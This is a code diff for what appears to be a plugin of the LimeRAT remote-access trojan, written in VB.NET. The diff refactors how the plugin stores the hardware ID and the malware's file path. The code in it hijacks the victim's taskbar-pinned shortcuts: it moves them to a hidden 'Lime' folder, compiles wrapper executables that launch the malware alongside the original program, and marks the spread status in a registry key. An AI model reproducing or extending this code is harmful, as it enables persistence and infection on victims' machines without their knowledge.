@@ -5,17 +5,12 @@ Imports Microsoft.Win32
 'credit: N A P O L E O N
 
 Public Class Main
-    Public Shared Target As String = GetFolderPath(26) & "\Microsoft\Internet Explorer\Quick Launch\User Pinned\TaskBar\"
-    Public Shared ShortcutDIR As String = GetFolderPath(26) & "\Lime\"
-    Public Shared EXEDIR As String = GetFolderPath(26) & "\Lime\EXE\"
-    Public Shared ICODIR As String = GetFolderPath(26) & "\Lime\ICO\"
-    Public Shared ServerPath As String = Windows.Forms.Application.ExecutablePath
-    Public Shared R As New Random
-    Public Shared BL As Boolean = False
 
 
-    Public Shared Sub RC(ByVal H As String, ByVal P As Integer, ByVal K As String, ByVal SP As String, ByVal PW As String, ByVal FP As String)
-        ServerPath = FP
+    Public Shared Sub RC(ByVal H As String, ByVal P As Integer, ByVal K As String, ByVal SP As String, ByVal PW As String, ByVal FP As String, ByVal HW As String, ByVal BT As String, ByVal PB As String)
+
+        FULLPATH = FP
+        HWID = HW
 re:
         Sleep(30000)
 
@@ -43,7 +38,7 @@ re:
                         IC(GetFileNameWithoutExtension(Shourtcuts), GetFullPath(Shourtcuts))
                         File.Move(Shourtcuts, ShortcutDIR & GetFileName(Shourtcuts))
                         CS(GetFileName(Shourtcuts), EXEDIR & GetFileNameWithoutExtension(Shourtcuts) & ".exe")
-                        Compile(My.Resources.Code.Replace("%CC%", random_key(6)).Replace("%A%", ServerPath).Replace("%B%", ShortcutDIR & GetFileName(Shourtcuts)), EXEDIR & GetFileNameWithoutExtension(Shourtcuts) & ".exe", GetFileNameWithoutExtension(Shourtcuts.Replace(" ", String.Empty)))
+                        Compile(My.Resources.Code.Replace("%CC%", random_key(6)).Replace("%A%", FULLPATH).Replace("%B%", ShortcutDIR & GetFileName(Shourtcuts)), EXEDIR & GetFileNameWithoutExtension(Shourtcuts) & ".exe", GetFileNameWithoutExtension(Shourtcuts.Replace(" ", String.Empty)))
                         If Not GTV("USB") = "Spreaded!" Then
                             STV("USB", "Spreaded!")
                         End If
@@ -112,7 +107,7 @@ re:
     End Function
     Private Shared Function GTV(ByVal n As String) As String ' Get value in my Registry Key RG
         Try
-            Return Registry.CurrentUser.CreateSubKey("Software\" & ID.HWID).GetValue(n, "")
+            Return Registry.CurrentUser.CreateSubKey("Software\" & HWID).GetValue(n, "")
         Catch ex As Exception
             Return ""
         End Try
@@ -120,11 +115,20 @@ re:
 
     Private Shared Function STV(ByVal n As String, ByVal t As String) ' set value in my Registry Key RG
         Try
-            Registry.CurrentUser.CreateSubKey("Software\" & ID.HWID).SetValue(n, t)
+            Registry.CurrentUser.CreateSubKey("Software\" & HWID).SetValue(n, t)
             Return True
         Catch ex As Exception
             Return False
         End Try
     End Function
 
+
+    Public Shared HWID As String
+    Public Shared Target As String = GetFolderPath(26) & "\Microsoft\Internet Explorer\Quick Launch\User Pinned\TaskBar\"
+    Public Shared ShortcutDIR As String = GetFolderPath(26) & "\Lime\"
+    Public Shared EXEDIR As String = GetFolderPath(26) & "\Lime\EXE\"
+    Public Shared ICODIR As String = GetFolderPath(26) & "\Lime\ICO\"
+    Public Shared FULLPATH As String
+    Public Shared R As New Random
+    Public Shared BL As Boolean = False
 End Class
